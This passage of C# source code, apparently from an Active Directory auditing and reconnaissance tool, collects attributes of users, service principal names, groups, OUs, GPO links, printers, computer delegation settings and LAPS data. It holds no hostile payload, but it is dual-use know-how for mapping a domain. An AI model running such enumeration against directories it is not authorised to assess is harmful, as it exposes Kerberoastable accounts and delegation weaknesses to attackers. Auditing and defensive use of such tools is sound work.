                    UserObj.Members.Add(new PSNoteProperty("ScriptPath", AdUser.Members["ScriptPath"].Value));
                    UserObj.Members.Add(new PSNoteProperty("UserAccountControl", AdUser.Members["UserAccountControl"].Value));
                    UserObj.Members.Add(new PSNoteProperty("First Name", CleanString(AdUser.Members["givenName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Middle Name", CleanString(AdUser.Members["middleName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Last Name", CleanString(AdUser.Members["sn"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Country", CleanString(AdUser.Members["c"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("whenCreated", AdUser.Members["whenCreated"].Value));
                    UserObj.Members.Add(new PSNoteProperty("whenChanged", AdUser.Members["whenChanged"].Value));
                    UserObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdUser.Members["DistinguishedName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("CanonicalName", AdUser.Members["CanonicalName"].Value));
                    return new PSObject[] { UserObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdUser = (PSObject) record;
                    List<PSObject> SPNList = new List<PSObject>();
                    bool? Enabled = null;
                    String Memberof = null;
                    DateTime? PasswordLastSet = null;

                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Members["userAccountControl"].Value != null)
                    {
                        var userFlags = (UACFlags) AdUser.Members["userAccountControl"].Value;
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                    }
                    if (Convert.ToString(AdUser.Members["pwdLastSet"].Value) != "0")
                    {
                        PasswordLastSet = DateTime.FromFileTime((long)AdUser.Members["pwdLastSet"].Value);
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members["servicePrincipalName"].Value;
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberOfAttribute = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members["memberof"].Value;
                    if (MemberOfAttribute.Value is System.String[])
                    {
                        foreach (String Member in (System.String[])MemberOfAttribute.Value)
                        {
                            Memberof = Memberof + "," + ((Convert.ToString(Member)).Split(',')[0]).Split('=')[1];
                        }
                        Memberof = Memberof.TrimStart(',');
                    }
                    else if (Memberof != null)
                    {
                        Memberof = ((Convert.ToString(MemberOfAttribute.Value)).Split(',')[0]).Split('=')[1];
                    }
                    String Description = CleanString(AdUser.Members["Description"].Value);
                    String PrimaryGroupID = Convert.ToString(AdUser.Members["primaryGroupID"].Value);
                    if (SPNs.Value is System.String[])
                    {
                        foreach (String SPN in (System.String[])SPNs.Value)
                        {
                            String[] SPNArray = SPN.Split('/');
                            PSObject UserSPNObj = new PSObject();
                            UserSPNObj.Members.Add(new PSNoteProperty("Name", AdUser.Members["Name"].Value));
                            UserSPNObj.Members.Add(new PSNoteProperty("Username", AdUser.Members["SamAccountName"].Value));
                            UserSPNObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                            UserSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                            UserSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                            UserSPNObj.Members.Add(new PSNoteProperty("Password Last Set", PasswordLastSet));
                            UserSPNObj.Members.Add(new PSNoteProperty("Description", Description));
                            UserSPNObj.Members.Add(new PSNoteProperty("Primary GroupID", PrimaryGroupID));
                            UserSPNObj.Members.Add(new PSNoteProperty("Memberof", Memberof));
                            SPNList.Add( UserSPNObj );
                        }
                    }
                    else
                    {
                        String[] SPNArray = Convert.ToString(SPNs.Value).Split('/');
                        PSObject UserSPNObj = new PSObject();
                        UserSPNObj.Members.Add(new PSNoteProperty("Name", AdUser.Members["Name"].Value));
                        UserSPNObj.Members.Add(new PSNoteProperty("Username", AdUser.Members["SamAccountName"].Value));
                        UserSPNObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                        UserSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Password Last Set", PasswordLastSet));
                        UserSPNObj.Members.Add(new PSNoteProperty("Description", Description));
                        UserSPNObj.Members.Add(new PSNoteProperty("Primary GroupID", PrimaryGroupID));
                        UserSPNObj.Members.Add(new PSNoteProperty("Memberof", Memberof));
                        SPNList.Add( UserSPNObj );
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    string ManagedByValue = Convert.ToString(AdGroup.Members["managedBy"].Value);
                    string ManagedBy = "";
                    String SIDHistory = "";

                    if (AdGroup.Members["managedBy"].Value != null)
                    {
                        ManagedBy = (ManagedByValue.Split(',')[0]).Split('=')[1];
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdGroup.Members["SIDHistory"].Value;
                    if (history.Value is System.Security.Principal.SecurityIdentifier[])
                    {
                        string sids = "";
                        foreach (var value in (SecurityIdentifier[]) history.Value)
                        {
                            sids = sids + "," + Convert.ToString(value);
                        }
                        SIDHistory = sids.TrimStart(',');
                    }
                    else
                    {
                        SIDHistory = history != null ? Convert.ToString(history.Value) : "";
                    }

                    PSObject GroupObj = new PSObject();
                    GroupObj.Members.Add(new PSNoteProperty("Name", AdGroup.Members["SamAccountName"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("AdminCount", AdGroup.Members["AdminCount"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("GroupCategory", AdGroup.Members["GroupCategory"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("GroupScope", AdGroup.Members["GroupScope"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("ManagedBy", ManagedBy));
                    GroupObj.Members.Add(new PSNoteProperty("SID", AdGroup.Members["sid"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    GroupObj.Members.Add(new PSNoteProperty("Description", CleanString(AdGroup.Members["Description"].Value)));
                    GroupObj.Members.Add(new PSNoteProperty("whenCreated", AdGroup.Members["whenCreated"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("whenChanged", AdGroup.Members["whenChanged"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGroup.Members["DistinguishedName"].Value)));
                    GroupObj.Members.Add(new PSNoteProperty("CanonicalName", AdGroup.Members["CanonicalName"].Value));
                    return new PSObject[] { GroupObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }


        class GroupRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    ADWSClass.AdGroupDictionary.Add((Convert.ToString(AdGroup.Properties["SID"].Value)), (Convert.ToString(AdGroup.Members["SamAccountName"].Value)));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupMemberRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    // based on https://github.com/BloodHoundAD/BloodHound/blob/master/PowerShell/BloodHound.ps1
                    PSObject AdGroup = (PSObject) record;
                    List<PSObject> GroupsList = new List<PSObject>();
                    string SamAccountType = Convert.ToString(AdGroup.Members["samaccounttype"].Value);
                    string AccountType = "";
                    string GroupName = "";
                    string MemberUserName = "-";
                    string MemberName = "";

                    if (Groups.Contains(SamAccountType))
                    {
                        AccountType = "group";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            if (MemberGroups.Value is System.String[])
                            {
                                foreach (String GroupMember in (System.String[])MemberGroups.Value)
                                {
                                    GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                    PSObject GroupMemberObj = new PSObject();
                                    GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                    GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                    GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                    GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                    GroupsList.Add( GroupMemberObj );
                                }
                            }
                            else
                            {
                                GroupName = (Convert.ToString(MemberGroups.Value).Split(',')[0]).Split('=')[1];
                                PSObject GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Users.Contains(SamAccountType))
                    {
                        AccountType = "user";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Members["sAMAccountName"].Value);
                        String PrimaryGroupID = Convert.ToString(AdGroup.Members["primaryGroupID"].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("{0} Exception caught.", e);
                            GroupName = PrimaryGroupID;
                        }

                        {
                            PSObject GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }

                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            if (MemberGroups.Value is System.String[])
                            {
                                foreach (String GroupMember in (System.String[])MemberGroups.Value)
                                {
                                    GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                    PSObject GroupMemberObj = new PSObject();
                                    GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                    GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                    GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                    GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                    GroupsList.Add( GroupMemberObj );
                                }
                            }
                            else
                            {
                                GroupName = (Convert.ToString(MemberGroups.Value).Split(',')[0]).Split('=')[1];
                                PSObject GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Computers.Contains(SamAccountType))
                    {
                        AccountType = "computer";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Members["sAMAccountName"].Value);
                        String PrimaryGroupID = Convert.ToString(AdGroup.Members["primaryGroupID"].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("{0} Exception caught.", e);
                            GroupName = PrimaryGroupID;
                        }

                        {
                            PSObject GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }

                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            if (MemberGroups.Value is System.String[])
                            {
                                foreach (String GroupMember in (System.String[])MemberGroups.Value)
                                {
                                    GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                    PSObject GroupMemberObj = new PSObject();
                                    GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                    GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                    GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                    GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                    GroupsList.Add( GroupMemberObj );
                                }
                            }
                            else
                            {
                                GroupName = (Convert.ToString(MemberGroups.Value).Split(',')[0]).Split('=')[1];
                                PSObject GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (TrustAccounts.Contains(SamAccountType))
                    {
                        // TO DO
                    }
                    return GroupsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class OURecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdOU = (PSObject) record;
                    PSObject OUObj = new PSObject();
                    OUObj.Members.Add(new PSNoteProperty("Name", AdOU.Members["Name"].Value));
                    OUObj.Members.Add(new PSNoteProperty("Depth", ((Convert.ToString(AdOU.Members["DistinguishedName"].Value).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1)));
                    OUObj.Members.Add(new PSNoteProperty("Description", AdOU.Members["Description"].Value));
                    OUObj.Members.Add(new PSNoteProperty("whenCreated", AdOU.Members["whenCreated"].Value));
                    OUObj.Members.Add(new PSNoteProperty("whenChanged", AdOU.Members["whenChanged"].Value));
                    OUObj.Members.Add(new PSNoteProperty("DistinguishedName", AdOU.Members["DistinguishedName"].Value));
                    return new PSObject[] { OUObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGPO = (PSObject) record;

                    PSObject GPOObj = new PSObject();
                    GPOObj.Members.Add(new PSNoteProperty("DisplayName", CleanString(AdGPO.Members["DisplayName"].Value)));
                    GPOObj.Members.Add(new PSNoteProperty("GUID", CleanString(AdGPO.Members["Name"].Value)));
                    GPOObj.Members.Add(new PSNoteProperty("whenCreated", AdGPO.Members["whenCreated"].Value));
                    GPOObj.Members.Add(new PSNoteProperty("whenChanged", AdGPO.Members["whenChanged"].Value));
                    GPOObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGPO.Members["DistinguishedName"].Value)));
                    GPOObj.Members.Add(new PSNoteProperty("FilePath", AdGPO.Members["gPCFileSysPath"].Value));
                    return new PSObject[] { GPOObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGPO = (PSObject) record;
                    ADWSClass.AdGPODictionary.Add((Convert.ToString(AdGPO.Members["DistinguishedName"].Value).ToUpper()), (Convert.ToString(AdGPO.Members["DisplayName"].Value)));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class SOMRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdSOM = (PSObject) record;
                    List<PSObject> SOMsList = new List<PSObject>();
                    int Depth = 0;
                    bool BlockInheritance = false;
                    bool? LinkEnabled = null;
                    bool? Enforced = null;
                    String gPLink = Convert.ToString(AdSOM.Members["gPLink"].Value);
                    String GPOName = null;

                    Depth = (Convert.ToString(AdSOM.Members["DistinguishedName"].Value).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1;
                    if (AdSOM.Members["gPOptions"].Value != null && (int) AdSOM.Members["gPOptions"].Value == 1)
                    {
                        BlockInheritance = true;
                    }
                    var GPLinks = gPLink.Split(']', '[').Where(x => x.StartsWith("LDAP"));
                    int Order = (GPLinks.ToArray()).Length;
                    if (Order == 0)
                    {
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Members["Name"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Members["DistinguishedName"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", null));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", AdSOM.Members["gPOptions"].Value));
                        SOMsList.Add( SOMObj );
                    }
                    foreach (String link in GPLinks)
                    {
                        String[] linksplit = link.Split('/', ';');
                        if (!Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 1)))
                        {
                            LinkEnabled = true;
                        }
                        else
                        {
                            LinkEnabled = false;
                        }
                        if (Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 2)))
                        {
                            Enforced = true;
                        }
                        else
                        {
                            Enforced = false;
                        }
                        GPOName = ADWSClass.AdGPODictionary.ContainsKey(linksplit[2].ToUpper()) ? ADWSClass.AdGPODictionary[linksplit[2].ToUpper()] : linksplit[2].Split('=',',')[1];
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Members["Name"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Members["DistinguishedName"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", Order));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", AdSOM.Members["gPOptions"].Value));
                        SOMsList.Add( SOMObj );
                        Order--;
                    }
                    return SOMsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class PrinterRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdPrinter = (PSObject) record;

                    PSObject PrinterObj = new PSObject();
                    PrinterObj.Members.Add(new PSNoteProperty("Name", AdPrinter.Members["Name"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("ServerName", AdPrinter.Members["serverName"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("ShareName", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["printShareName"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverName", AdPrinter.Members["driverName"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverVersion", AdPrinter.Members["driverVersion"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("PortName", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["portName"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("URL", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["url"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("whenCreated", AdPrinter.Members["whenCreated"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("whenChanged", AdPrinter.Members["whenChanged"].Value));
                    return new PSObject[] { PrinterObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    bool Dormant = false;
                    bool PasswordNotChangedafterMaxAge = false;
                    String SIDHistory = "";
                    String DelegationType = null;
                    String DelegationProtocol = null;
                    String DelegationServices = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;

                    if (AdComputer.Members["LastLogonDate"].Value != null)
                    {
                        //LastLogonDate = DateTime.FromFileTime((long)(AdComputer.Members["lastLogonTimeStamp"].Value));
                        // LastLogonDate is lastLogonTimeStamp converted to local time
                        LastLogonDate = Convert.ToDateTime(AdComputer.Members["LastLogonDate"].Value);
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    if (AdComputer.Members["PasswordLastSet"].Value != null)
                    {
                        //PasswordLastSet = DateTime.FromFileTime((long)(AdComputer.Members["pwdLastSet"].Value));
                        // PasswordLastSet is pwdLastSet converted to local time
                        PasswordLastSet = Convert.ToDateTime(AdComputer.Members["PasswordLastSet"].Value);
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    if ( ((bool) AdComputer.Members["TrustedForDelegation"].Value) && ((int) AdComputer.Members["primaryGroupID"].Value == 515) )
                    {
                        DelegationType = "Unconstrained";
                        DelegationServices = "Any";
                    }
                    if (AdComputer.Members["msDS-AllowedToDelegateTo"] != null)
                    {
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection delegateto = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members["msDS-AllowedToDelegateTo"].Value;
                        if (delegateto.Value != null)
                        {
                            DelegationType = "Constrained";
                            if (delegateto.Value is System.String[])
                            {
                                foreach (var value in (String[]) delegateto.Value)
                                {
                                    DelegationServices = DelegationServices + "," + Convert.ToString(value);
                                }
                                DelegationServices = DelegationServices.TrimStart(',');
                            }
                            else
                            {
                                DelegationServices = Convert.ToString(delegateto.Value);
                            }
                        }
                    }
                    if ((bool) AdComputer.Members["TrustedToAuthForDelegation"].Value)
                    {
                        DelegationProtocol = "Any";
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = "Kerberos";
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members["SIDHistory"].Value;
                    if (history.Value is System.Security.Principal.SecurityIdentifier[])
                    {
                        string sids = "";
                        foreach (var value in (SecurityIdentifier[]) history.Value)
                        {
                            sids = sids + "," + Convert.ToString(value);
                        }
                        SIDHistory = sids.TrimStart(',');
                    }
                    else
                    {
                        SIDHistory = history != null ? Convert.ToString(history.Value) : "";
                    }
                    String OperatingSystem = CleanString((AdComputer.Members["OperatingSystem"].Value != null ? AdComputer.Members["OperatingSystem"].Value : "-") + " " + AdComputer.Members["OperatingSystemHotfix"].Value + " " + AdComputer.Members["OperatingSystemServicePack"].Value + " " + AdComputer.Members["OperatingSystemVersion"].Value);

                    PSObject ComputerObj = new PSObject();
                    ComputerObj.Members.Add(new PSNoteProperty("Name", AdComputer.Members["Name"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("DNSHostName", AdComputer.Members["DNSHostName"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Enabled", AdComputer.Members["Enabled"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("IPv4Address", AdComputer.Members["IPv4Address"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    ComputerObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    ComputerObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    ComputerObj.Members.Add(new PSNoteProperty("UserName", AdComputer.Members["SamAccountName"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Primary Group ID", AdComputer.Members["primaryGroupID"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("SID", AdComputer.Members["SID"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    ComputerObj.Members.Add(new PSNoteProperty("Description", AdComputer.Members["Description"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("ms-ds-CreatorSid", AdComputer.Members["ms-ds-CreatorSid"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    ComputerObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    ComputerObj.Members.Add(new PSNoteProperty("UserAccountControl", AdComputer.Members["UserAccountControl"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("whenCreated", AdComputer.Members["whenCreated"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("whenChanged", AdComputer.Members["whenChanged"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Distinguished Name", AdComputer.Members["DistinguishedName"].Value));
                    return new PSObject[] { ComputerObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    List<PSObject> SPNList = new List<PSObject>();

                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdComputer.Members["servicePrincipalName"].Value;
                    if (SPNs.Value is System.String[])
                    {
                        foreach (String SPN in (System.String[])SPNs.Value)
                        {
                            bool flag = true;
                            String[] SPNArray = SPN.Split('/');
                            foreach (PSObject Obj in SPNList)
                            {
                                if ( (String) Obj.Members["Service"].Value == SPNArray[0] )
                                {
                                    Obj.Members["Host"].Value = String.Join(",", (Obj.Members["Host"].Value + "," + SPNArray[1]).Split(',').Distinct().ToArray());
                                    flag = false;
                                }
                            }
                            if (flag)
                            {
                                PSObject ComputerSPNObj = new PSObject();
                                ComputerSPNObj.Members.Add(new PSNoteProperty("Name", AdComputer.Members["Name"].Value));
                                ComputerSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                                ComputerSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                                SPNList.Add( ComputerSPNObj );
                            }
                        }
                    }
                    else
                    {
                        String[] SPNArray = Convert.ToString(SPNs.Value).Split('/');
                        PSObject ComputerSPNObj = new PSObject();
                        ComputerSPNObj.Members.Add(new PSNoteProperty("Name", AdComputer.Members["Name"].Value));
                        ComputerSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                        ComputerSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                        SPNList.Add( ComputerSPNObj );
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class LAPSRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    bool PasswordStored = false;
                    DateTime? CurrentExpiration = null;
                    try
                    {
                        CurrentExpiration = DateTime.FromFileTime((long)(AdComputer.Members["ms-Mcs-AdmPwdExpirationTime"].Value));
